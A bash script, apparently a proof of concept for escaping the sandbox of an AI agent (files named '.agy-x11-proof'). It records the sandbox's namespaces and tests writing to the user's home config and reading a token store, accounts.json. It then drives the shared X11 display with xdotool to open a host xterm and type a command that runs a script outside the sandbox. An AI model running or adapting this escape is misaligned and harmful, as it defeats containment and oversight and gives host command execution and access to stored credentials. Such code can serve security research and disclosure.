#!/bin/bash

set +e

runtime_root="$PWD"
proof_dir="$runtime_root/.agy-x11-proof"
runtime_log="$proof_dir/runtime.log"
host_runner="$runtime_root/host-runtime-report.sh"
direct_marker="$HOME/.config/agy-x11-direct-control.txt"

mkdir -p "$proof_dir"

{
  printf 'probe_version=1\n'
  printf 'sandbox_pid=%s sandbox_ppid=%s uid=%s gid=%s\n' \
    "$$" "$PPID" "$(id -u)" "$(id -g)"
  printf 'sandbox_mnt=%s sandbox_pid_ns=%s sandbox_user_ns=%s sandbox_net=%s\n' \
    "$(readlink /proc/self/ns/mnt 2>&1)" \
    "$(readlink /proc/self/ns/pid 2>&1)" \
    "$(readlink /proc/self/ns/user 2>&1)" \
    "$(readlink /proc/self/ns/net 2>&1)"
  printf 'cwd=%s display=%s xdg_runtime_dir=%s\n' \
    "$runtime_root" "${DISPLAY-}" "${XDG_RUNTIME_DIR-}"
  printf 'xdotool=%s\n' "$(command -v xdotool 2>&1)"
  printf 'x11_socket='
  display_number=${DISPLAY#:}
  display_number=${display_number%%.*}
  stat -Lc 'mode=%a uid=%u gid=%g dev=%d ino=%i path=%n' \
    "/tmp/.X11-unix/X$display_number" 2>&1
  printf 'active_window_before='
  xdotool getactivewindow getwindowclassname getwindowname 2>&1 | tr '\n' '/'
  printf '\n'

  direct_error=$( { printf 'direct-control\n' > "$direct_marker"; } 2>&1 )
  direct_rc=$?
  printf 'normal_path_write rc=%s exists=%s error=%s\n' \
    "$direct_rc" "$([ -e "$direct_marker" ] && printf yes || printf no)" "$direct_error"

  printf 'normal_path_token_store_read='
  wc -c < /home/stazot/HyveCLI/data/accounts.json 2>&1

  pre_xterms=$(xdotool search --onlyvisible --class XTerm 2>/dev/null | tr '\n' ' ')
  printf 'preexisting_xterm_ids=%s\n' "$pre_xterms"

  printf 'openbox_root_menu='
  xdotool mousemove 21 21 click 3 2>&1
  printf 'rc=%s\n' "$?"
  sleep 1
  xdotool mousemove 80 122 2>&1
  sleep 2
  printf 'select_xterm='
  xdotool mousemove 175 166 click 1 2>&1
  printf 'rc=%s\n' "$?"

  xterm_id=
  wait_count=0
  while [ "$wait_count" -lt 15 ] && [ -z "$xterm_id" ]; do
    current_xterms=$(xdotool search --onlyvisible --class XTerm 2>/dev/null)
    for candidate in $current_xterms; do
      case " $pre_xterms " in
        *" $candidate "*) ;;
        *) xterm_id=$candidate ;;
      esac
    done
    [ -n "$xterm_id" ] && break
    sleep 1
    wait_count=$((wait_count + 1))
  done
  printf 'new_xterm_id=%s waited_seconds=%s\n' "${xterm_id:-none}" "$wait_count"

  if [ -n "$xterm_id" ]; then
    printf -v typed_command '/bin/bash %q %q; exit' "$host_runner" "$runtime_root"
    printf 'typed_command=%s\n' "$typed_command"
    xdotool windowactivate "$xterm_id" 2>&1
    sleep 1
    printf 'xterm_type='
    xdotool type --clearmodifiers --window "$xterm_id" --delay 2 "$typed_command" 2>&1
    printf 'rc=%s\n' "$?"
    printf 'xterm_return='
    xdotool key --clearmodifiers --window "$xterm_id" Return 2>&1
    printf 'rc=%s\n' "$?"

    evidence_wait=0
    while [ "$evidence_wait" -lt 60 ] && [ ! -e "$runtime_root/.x11-package-evidence.txt" ]; do
      sleep 1
      evidence_wait=$((evidence_wait + 1))
    done
    printf 'host_preflight_exists=%s package_evidence_exists=%s waited_seconds=%s\n' \
      "$([ -e "$runtime_root/.x11-host-preflight.txt" ] && printf yes || printf no)" \
      "$([ -e "$runtime_root/.x11-package-evidence.txt" ] && printf yes || printf no)" \
      "$evidence_wait"
  fi
} > "$runtime_log" 2>&1

printf 'runtime-x11-token\0'
